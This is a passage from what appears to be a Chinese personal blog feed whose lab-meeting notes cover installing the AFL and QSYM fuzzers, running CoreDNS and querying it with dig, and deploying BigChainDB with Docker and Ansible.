http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse &gt;&gt;/etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jingtianer: 国内源</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y git build-essential sudo python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /workdir/qsym</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /workdir/qsym</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y lsb-core</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y libc6 libstdc++6 linux-libc-dev gcc-multilib g++-multilib \</span></span><br><span class="line"><span class="language-bash">  llvm-dev g++ g++-multilib python \</span></span><br><span class="line"><span class="language-bash">  lsb-release</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y gcc make python-pip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /workdir/qsym</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pip</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># jingtianer: pip清华源</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN echo kernel.yama.ptrace_scope = 0 | sudo tee /etc/sysctl.d/10-ptrace.conf</span></span><br><span class="line"><span class="comment"># jingtianer: ptrace置为0</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install python-afl</span></span><br><span class="line"><span class="comment"># jingtianer: test需要的依赖包</span></span><br></pre></td></tr></table></figure><blockquote><p>docker 方式在ubuntu22.04中配置安装，但是不能成功运行测试代码</p></blockquote><blockquote><p>两种方法都无法在wsl中使用，缺少文件夹<code>/proc/sys/kernel/yama</code><br>两种方法在编译时都存在warnings</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;afl的安装&quot;&gt;&lt;a href=&quot;#afl的安装&quot; class=&quot;headerlink&quot; title=&quot;afl的安装&quot;&gt;&lt;/a&gt;afl的安装&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;安装&lt;code&gt;build-essentials&lt;/code&gt;和&lt;code&gt;cmake&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;github下载源码并解压&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;usr/local/bin&lt;/code&gt;下有了编译好的afl工具&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@tt-HP:~/dns_env&lt;span class=&quot;comment&quot;&gt;# find /usr/local/bin/afl*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-analyze&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-clang&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-clang++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-cmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-fuzz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-g++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-gcc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-gotcpu&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-plot&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-showmap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-tmin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/usr/local/bin/afl-whatsup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;qsym的安装&quot;&gt;&lt;a href=&quot;#qsym的安装&quot; class=&quot;headerlink&quot; title=&quot;qsym的安装&quot;&gt;&lt;/a&gt;qsym的安装&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;以下是安装方法&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# disable ptrace_scope for PIN&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; 0|sudo &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; /proc/sys/kernel/yama/ptrace_scope&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install z3 and system deps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ./setup.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# install using virtual env&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ virtualenv venv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; venv/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ pip install .&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;不用wsl用vm就不会有很多问题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="QSYM" scheme="https://jingtianer.github.io/home/tags/QSYM/"/>
    
    <category term="afl" scheme="https://jingtianer.github.io/home/tags/afl/"/>
    
  </entry>
  
  <entry>
    <title>CoreDNS安装使用</title>
    <link href="https://jingtianer.github.io/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/"/>
    <id>https://jingtianer.github.io/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/</id>
    <published>2023-01-01T04:15:37.000Z</published>
    <updated>2023-01-01T15:04:50.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="coredns简介"><a class="markdownIt-Anchor" href="#coredns简介"></a> CoreDNS简介</h2><ul><li>是一个DNS服务器</li><li>支持插件</li><li>使用Go编写的</li></ul><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><ul><li>预编译的可执行文件<a href="https://github.com/coredns/coredns/releases/tag/v1.10.0">下载地址</a></li><li>Docker <a href="https://hub.docker.com/r/coredns/coredns/">DockerHub-CoreDNS</a></li><li>源代码编译</li></ul><blockquote><p>安装很简单，下载解压可以得到一个<code>coredns</code>可执行文件</p></blockquote><h2 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h2><h3 id="启动服务"><a class="markdownIt-Anchor" href="#启动服务"></a> 启动服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./coredns -dns.port=1053</span><br></pre></td></tr></table></figure><h3 id="测试服务"><a class="markdownIt-Anchor" href="#测试服务"></a> 测试服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @localhost -p 1053 a whoami.example.org</span><br></pre></td></tr></table></figure><blockquote><p>以上命令均未报错，且coredns打印出了服务日志</p></blockquote><h2 id="插件"><a class="markdownIt-Anchor" href="#插件"></a> 插件</h2><p><a href="https://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/">官方插件教程</a></p><p>可以通过实现以下go语言接口，使插件获取dns服务器的请求，进行处理并返回处理结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(wh Whoami)</span></span> ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (<span class="type">int</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><h2 id="补充知识"><a class="markdownIt-Anchor" href="#补充知识"></a> 补充知识</h2><h3 id="dig命令"><a class="markdownIt-Anchor" href="#dig命令"></a> dig命令</h3><p>dig(domain information group)是常用的域名查询工具，该工具可以从指定DNS服务器查询主机信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.1-1ubuntu1.2-Ubuntu &lt;&lt;&gt;&gt; @localhost -p 1053 a whoami.example.org</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: QUERY, status: NOERROR, id: 32883</span></span><br><span class="line"><span class="string">;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 3</span></span><br><span class="line"><span class="string">;; WARNING: recursion requested but not available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; OPT PSEUDOSECTION:</span></span><br><span class="line"><span class="string">; EDNS: version: 0, flags:; udp: 1232</span></span><br><span class="line"><span class="string">; COOKIE: 83bd45262339483b (echoed)</span></span><br><span class="line"><span class="string">;; QUESTION SECTION:</span></span><br><span class="line"><span class="string">;whoami.example.org.            IN      A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;; ADDITIONAL SECTION:</span></span><br><span class="line"><span class="string">whoami.example.org.     0       IN      A       127.0.0.1</span></span><br><span class="line"><span class="string">_udp.whoami.example.org. 0      IN      SRV     0 0 41003 .</span></span><br></pre></td></tr></table></figure><ul><li>dig 的查询时间</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 127.0.0.1<span class="comment">#1053(localhost) (UDP)</span></span><br><span class="line">;; WHEN: Sun Jan 01 10:49:45 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 135</span><br></pre></td></tr></table></figure><h4 id="dig的参数"><a class="markdownIt-Anchor" href="#dig的参数"></a> dig的参数</h4><ul><li>指定DNS查询记录</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig www.baidu.com A     <span class="comment"># 查询A记录，如果域名后面不加任何参数，默认查询A记录</span></span><br><span class="line">dig www.baidu.com MX    <span class="comment"># 查询MX记录</span></span><br><span class="line">dig www.baidu.com CNAME <span class="comment"># 查询CNAME记录</span></span><br><span class="line">dig www.baidu.com NS    <span class="comment"># 查询NS记录</span></span><br><span class="line">dig www.baidu.com ANY   <span class="comment"># 查询上面所有的记录</span></span><br><span class="line"></span><br><span class="line">dig www.baidu.com A +short      <span class="comment"># 查询A记录并显示简要的返回的结果</span></span><br><span class="line">dig www.baidu.com A +multiline  <span class="comment"># 查询A记录并显示详细的返回结果</span></span><br></pre></td></tr></table></figure><ul><li>指定dns服务器</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @DNS_SERVER_IP -p port www.baidu.com</span><br></pre></td></tr></table></figure><ul><li>只打印answer部分</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -p 1053 @localhost +noall +answer &lt;name&gt; &lt;<span class="built_in">type</span>&gt;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_41982020/article/details/121231166">其他信息</a></p><h3 id="dns记录类型"><a class="markdownIt-Anchor" href="#dns记录类型"></a> DNS记录类型</h3><p>DNS记录类型包含：A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发。对这些类型的记录解释如下：</p><ul><li><p>A记录<br />将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p></li><li><p>AAAA记录<br />将域名指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录</p></li><li><p>CNAME记录<br />将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名</p></li><li><p>MX记录<br />将域名指向一个邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</p></li><li><p>NS记录<br />记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</p></li><li><p>PTR记录<br />PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名</p></li><li><p>SRV记录<br />Service Record，用于指定服务器提供服务的位置（如主机名和端口）数据</p></li></ul><h2 id="在windows下访问dns服务器"><a class="markdownIt-Anchor" href="#在windows下访问dns服务器"></a> 在windows下访问dns服务器</h2><p>在windows中使用dig命令进行试验，如果windows可以正常输出，且dns服务器可以打印相应的日志即可</p><h3 id="bind9-的安装"><a class="markdownIt-Anchor" href="#bind9-的安装"></a> Bind9 的安装</h3><p>dig命令属于bind工具，官方提供了<a href="ftp://ftp.isc.org/isc/bind9/9.9.9rc1/">ftp</a>服务器用于下载</p><h3 id="使用dig命令"><a class="markdownIt-Anchor" href="#使用dig命令"></a> 使用dig命令</h3><p>我使用的是wsl，首先在wsl中使用ifconfig找到wsl的ip地址，并使用下面的命令进行测试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @172.23.208.1 -p 1053 www.baidu.com</span><br></pre></td></tr></table></figure><blockquote><p>观察到命令可以正常返回，dns服务器也打印出了相应的日志</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;coredns简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#coredns简介&quot;&gt;&lt;/a&gt; CoreDNS简介&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是一个DNS服务器&lt;/li&gt;
&lt;li&gt;支持插件&lt;/li&gt;
&lt;li&gt;使用Go编写的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;安装&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#安装&quot;&gt;&lt;/a&gt; 安装&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;预编译的可执行文件&lt;a href=&quot;https://github.com/coredns/coredns/releases/tag/v1.10.0&quot;&gt;下载地址&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Docker &lt;a href=&quot;https://hub.docker.com/r/coredns/coredns/&quot;&gt;DockerHub-CoreDNS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;源代码编译&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;安装很简单，下载解压可以得到一个&lt;code&gt;coredns&lt;/code&gt;可执行文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;测试&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#测试&quot;&gt;&lt;/a&gt; 测试&lt;/h2&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="CoreDNS" scheme="https://jingtianer.github.io/home/tags/CoreDNS/"/>
    
  </entry>
  
  <entry>
    <title>BigChain DB的安装与使用</title>
    <link href="https://jingtianer.github.io/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/"/>
    <id>https://jingtianer.github.io/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/</id>
    <published>2022-12-05T04:15:37.000Z</published>
    <updated>2022-12-05T06:08:37.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="step1-构建一个BigChainDB节点"><a href="#step1-构建一个BigChainDB节点" class="headerlink" title="step1. 构建一个BigChainDB节点"></a>step1. 构建一个BigChainDB节点</h2><h3 id="使用All-in-One-Docker搭建"><a href="#使用All-in-One-Docker搭建" class="headerlink" title="使用All-in-One Docker搭建"></a>使用All-in-One Docker搭建</h3><ul><li>拉取镜像</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull bigchaindb/bigchaindb:all-in-one</span><br></pre></td></tr></table></figure><ul><li>运行<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --detach \</span><br><span class="line">  --name bigchaindb \</span><br><span class="line">  --publish 9984:9984 \</span><br><span class="line">  --publish 9985:9985 \</span><br><span class="line">  --publish 27017:27017 \</span><br><span class="line">  --publish 26657:26657 \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/mongodb/data/db:/data/db \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/mongodb/data/configdb:/data/configdb \</span><br><span class="line">  --volume <span class="variable">$HOME</span>/bigchaindb_docker/tendermint:/tendermint \</span><br><span class="line">  bigchaindb/bigchaindb:all-in-one</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用Ansible一键脚本搭建"><a href="#使用Ansible一键脚本搭建" class="headerlink" title="使用Ansible一键脚本搭建"></a>使用Ansible一键脚本搭建</h3><h4 id="什么是Ansible-Playbooks"><a href="#什么是Ansible-Playbooks" class="headerlink" title="什么是Ansible Playbooks"></a>什么是Ansible Playbooks</h4><blockquote><p>Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the ansible-examples repository illustrate many useful techniques. You may want to look at these in another tab as you read the documentation.</p></blockquote><ul><li>是一个为了便于多机搭建的工具</li></ul><h4 id="安装Ansible-Playbooks"><a href="#安装Ansible-Playbooks" class="headerlink" title="安装Ansible Playbooks"></a>安装Ansible Playbooks</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --user ansible</span><br></pre></td></tr></table></figure><h4 id="使用ansible安装BigChainDB"><a href="#使用ansible安装BigChainDB" class="headerlink" title="使用ansible安装BigChainDB"></a>使用ansible安装BigChainDB</h4><ul><li>配置hosts中的all文件，使用basicconfig<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Basic configuration</span></span><br><span class="line"><span class="string">&lt;HOSTNAME&gt;</span>  <span class="string">ansible_ssh_user=tt</span> <span class="string">ansible_sudo_pass=123456</span> <span class="string">voting_power=&lt;INT&gt;</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /root/bigchaindb/bigchaindb-node-ansible:/home/bigchaindb-node-ansible -p 9983:9984  ubuntu /bin/bash</span><br><span class="line">ansible-playbook install.yml -i hosts/all --extra-vars <span class="string">&quot;top_dir=<span class="subst">$(pwd)</span>&quot;</span></span><br><span class="line"><span class="comment"># 或者使用</span></span><br><span class="line">python3 -m ansible playbook install.yml -i hosts/all --extra-vars <span class="string">&quot;top_dir=<span class="subst">$(pwd)</span>&quot;</span></span><br></pre></td></tr></table></figure><ul><li>官网的这个可能用不了，他的原理可能是通过ssh连接进行配置，我们需要后续建立一个ssh</li><li>后续可以自己搭建ansible Control Node达到多机搭建的作用</li></ul><h3 id="不使用docker"><a href="#不使用docker" class="headerlink" title="不使用docker"></a>不使用docker</h3><ul><li><a href="http://docs.bigchaindb.com/en/latest/installation/node-setup/set-up-node-software.html">官方教程</a></li></ul><blockquote><p>以上三种方法任选其一就可以，第三种方法如果需要一个机器对应一个节点时再考虑。</p></blockquote><h2 id="step2-建立网络"><a href="#step2-建立网络" class="headerlink" title="step2. 建立网络"></a>step2. 建立网络</h2><h3 id="编写docker-compose文件"><a href="#编写docker-compose文件" class="headerlink" title="编写docker compose文件"></a>编写docker compose文件</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2.1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mongodb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo:3.6</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;27017:27017&quot;</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">mongod</span></span><br><span class="line">  <span class="attr">bigchaindb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">bigchaindb/bigchaindb</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mongodb</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">tendermint</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_BACKEND:</span> <span class="string">localmongodb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_HOST:</span> <span class="string">mongodb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_DATABASE_PORT:</span> <span class="number">27017</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_SERVER_BIND:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:9984</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_WSSERVER_HOST:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_WSSERVER_ADVERTISED_HOST:</span> <span class="string">bigchaindb</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_TENDERMINT_HOST:</span> <span class="string">tendermint</span></span><br><span class="line">      <span class="attr">BIGCHAINDB_TENDERMINT_PORT:</span> <span class="number">26657</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9984:9984&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9985:9985&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;26658:26658&quot;</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl http://bigchaindb:9984 &amp;&amp; curl http://tendermint:26657/abci_query&quot;</span>]</span><br><span class="line">      <span class="attr">interval:</span> <span class="string">3s</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">5s</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span></span><br><span class="line">    <span class="comment">#command: &#x27;bigchaindb start&#x27;</span></span><br><span class="line">  <span class="attr">tendermint:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tendermint/tendermint:0.22.8</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tmdata:/tendermint</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span 